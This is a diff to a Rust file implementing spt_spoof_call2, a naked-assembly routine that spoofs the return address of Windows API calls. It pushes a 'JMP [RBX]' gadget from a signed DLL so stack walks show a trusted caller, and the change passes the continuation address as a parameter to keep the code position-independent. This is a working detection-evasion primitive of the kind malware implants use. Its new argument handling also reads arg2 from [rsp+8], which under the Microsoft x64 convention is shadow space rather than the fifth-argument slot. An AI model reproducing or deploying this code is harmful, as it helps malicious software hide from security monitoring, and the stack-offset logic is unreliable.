@@ -6,25 +6,30 @@
 //!
 //! Calling convention walkthrough (Microsoft x64, stack alignment kept):
 //!
-//! `spt_spoof_call2(api, gadget, arg1, arg2)` entered by `call`:
+//! `spt_spoof_call2(api, gadget, cont, arg1, arg2)` entered by `call`:
 //!   - RCX = api address, RDX = gadget (a `JMP [RBX]` in a signed DLL),
-//!     R8/R9 = the API's first two arguments.
+//!     R8 = continuation address, R9 = arg1, [rsp+8] = arg2 (5th slot).
 //!   - entry RSP points at the real return address; RSP ≡ 8 (mod 16).
+//!   - the continuation address arrives as a PARAMETER, materialized by
+//!     rustc as a rip-relative reference at the (PIC) call site — a `sym`
+//!     operand inside the asm would emit an absolute address and break
+//!     the position-independence proof (the CI catches exactly that).
 //!
 //! ```text
 //! mov rax, rcx      ; api
+//! mov r10, [rsp+8]  ; arg2 (read before the stack is rearranged)
 //! push rbx          ; preserve the caller's callee-saved RBX
 //! push rdx          ; the gadget becomes the API's return address
-//! mov rbx, cont     ; the gadget jumps here after the API returns
-//! mov rcx, r8       ; arg1
-//! mov rdx, r9       ; arg2
+//! mov rbx, r8       ; continuation: the gadget jumps here
+//! mov rcx, r9       ; arg1
+//! mov rdx, r10      ; arg2
 //! jmp rax           ; tail-jump: the API sees [rsp] = gadget (signed DLL)
 //! ```
 //!
 //! The stack walk of the API now shows a signed module as its caller. When
 //! the API executes `ret`, RIP lands on `JMP [RBX]` inside the signed DLL,
 //! which jumps to `spt_retspoof_continue` (RBX is callee-saved, so the
-//! address survives the entire API call):
+//! continuation address survives the entire API call):
 //!
 //! ```text
 //! spt_retspoof_continue:
@@ -43,26 +48,27 @@ use core::ffi::c_void;
 ///
 /// # Safety
 ///
-/// `gadget` (RDX) must be the address of a `JMP [RBX]` instruction inside a
-/// mapped signed DLL, `api` (RCX) a valid function of two register
-/// arguments; the API must not take stack arguments.
+/// `gadget` must be the address of a `JMP [RBX]` instruction inside a
+/// mapped signed DLL, `api` a valid function of two register arguments, and
+/// `cont` the address of `spt_retspoof_continue`.
 #[unsafe(naked)]
 #[unsafe(no_mangle)]
 pub unsafe extern "C" fn spt_spoof_call2(
     api: usize,
     gadget: usize,
+    cont: usize,
     arg1: usize,
     arg2: usize,
 ) -> usize {
     naked_asm!(
         "mov rax, rcx",
+        "mov r10, [rsp + 8]",
         "push rbx",
         "push rdx",
-        "mov rbx, {cont}",
-        "mov rcx, r8",
-        "mov rdx, r9",
+        "mov rbx, r8",
+        "mov rcx, r9",
+        "mov rdx, r10",
         "jmp rax",
-        cont = sym spt_retspoof_continue,
     );
 }
 
